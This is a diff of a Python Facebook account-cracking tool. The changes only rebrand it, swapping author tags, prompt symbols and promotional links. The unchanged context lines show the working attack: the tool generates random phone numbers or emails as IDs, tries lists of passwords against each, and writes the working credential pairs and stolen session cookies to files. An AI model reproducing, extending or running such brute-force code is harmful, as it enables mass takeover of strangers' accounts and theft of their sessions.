@@ -339,7 +339,7 @@ def menu():
 	print ("\033[1;97m[1]\033[1;33m FILE CLONING ")
 	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
 	print ("\033[1;97m[3]\033[1;33m MY Facebook ID")
-	ot = input('\n   \x1b[1;32m Choose option >>> ')
+	ot = input('\n   \x1b[1;32m Choose option ➤ ')
 	if ot == '1':
 		os.system('xdg-open https://www.facebook.com/groups/1302330730660806/?ref=share&mibextid=NSMWBT')
 		crack_file()
@@ -365,7 +365,7 @@ def menu1():
 	print ("\033[1;97m     [1]\033[1;33m FILE CLONING")
 	print ("\033[1;97m     [2]\033[1;33m BANGLADESH NUMBER")
 	print ("\033[1;97m     [3]\033[1;33m FB GROUP")
-	ot = input('\n   \x1b[1;32m Choose option >>> ')
+	ot = input('\n   \x1b[1;32m Choose option ➤ ')
 	if ot == '1':
 		os.system('xdg-open https://www.facebook.com/groups/1302330730660806/?ref=share&mibextid=NSMWBT')
 		crack_file()
@@ -389,7 +389,7 @@ def rndm():
 |        92302 ✧ 92301 ✧ 91778     |
 +------------------------------+
 """)
-	cod = input('\n INPUT YOUR SIM CODE: ')
+	cod = input('\n INPUT YOUR SIM CODE ➤ ')
 	if len(cod) != 4:
 		print("Incorrect code")
 	else:
@@ -397,7 +397,7 @@ def rndm():
 	print (f"{warna3}")
 	clear()
 	print(gyc)
-	limit = int(input(' INPUT LIMIT: '))
+	limit = int(input(' INPUT LIMIT ➤ '))
 	for num in range (limit):
 		nm = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nm)
@@ -409,9 +409,9 @@ def rndm():
 	
 	sai = []
 	if csp in ['y','Y','yes','Yes','1']:
-		psx = int(input(" Enter Password Limit: "))
+		psx = int(input(" Enter Password Limit ➤ "))
 		for sa in range(psx):
-			pww = input(f"{so} Enter Password: ")
+			pww = input(f"{so} Enter Password ➤ ")
 			sai.append(pww)
 	else:
 		pass
@@ -440,8 +440,8 @@ def mail():
 	print (f"{warna4}")
 	clear()
 	print(gyc)
-	first = input(' [π] Email FARST NAME: ')
-	last = input(' [π] Email LAST NAME :  ')
+	first = input(' [π] Email FARST NAME ➤ ')
+	last = input(' [π] Email LAST NAME ➤  ')
 	print (f"{warna}")
 	clear()
 	print(gyc)
@@ -451,7 +451,7 @@ def mail():
 		doamin = ('@gmail.com')
 	elif '2' in mnum:
 		doamin = ('@yahoo.com')
-	limit = int(input('[π]EXAMPLE: 3000, 5000, 15000, 20000\nCHOOSE CLONING LIMIT : '))
+	limit = int(input('[π]EXAMPLE ➤ 3000 ✧ 5000 ✧ 15000 ✧ 20000\nCHOOSE CLONING LIMIT : '))
 	for nmbr in range(limit):
 		nm = ''.join(random.choice(string.digits) for _ in range(1,4))
 		user.append(nm)
@@ -579,7 +579,7 @@ def c(uid,pwx,ln):
         for ps in pwx:
             session = requests.Session()
             wa = random.choice(my_color)
-            sys.stdout.write(f'\r%s[N3OB_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
+            sys.stdout.write(f'\r%s[ MOHAMMAD_JIBON ] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             
@@ -604,10 +604,10 @@ def c(uid,pwx,ln):
             #	botok(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[65:80]
-            	print('\033[1;92mN3OB-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
+            	print('\033[1;92mJIBON-OK[✧]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
             	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('N3OB-OK.txt', 'a').write( cid+' | '+ps+'\n')
-            	open('N3OB-coki.txt', 'a').write(coki+'\n')
+            	open('JIBON-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('JIBON-coki.txt', 'a').write(coki+'\n')
             	cek_apk(session,coki)
             	oks.append(cid)
             	break
@@ -615,9 +615,9 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(N3OB-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\33[1;30m(JIBON-Cp [✧] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('N3OB-CP.txt', 'a').write( uid+' | '+ps+' \n')
+            	open('JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
             	break
             else:
@@ -634,7 +634,7 @@ def c(uid,pwx,ln):
 def crack_file():
 	
 	clear()
-	o = input('\x1b[1;97m [π] FILE NAME : ')
+	o = input('\x1b[1;97m [π] FILE NAME ➤ ')
 	print('')
 	try:lin = open(o).read().splitlines()
 	except:
@@ -713,9 +713,9 @@ def passwrd():
     
 	
 	
-nam = "N3OB"
-name = "[N3OV-OK]"
-name1 = "[N3OB-CP]"
+nam = "JIBON"
+name = "[JIBON-OK]"
+name1 = "[JIBON-CP]"
 
 
 def crack(idf,pwv):
@@ -775,7 +775,7 @@ def toolscontrol():
 		clear()
 		jalan (" THIS TOOLS IS NOT WORKING PLEASE WAIT FOR NEXT UPDATE")
 		time.sleep(1)
-		os.system('xdg-open https://facebook.com/100074591152479')
+		os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
 		exit()
 	else:
 		exit()
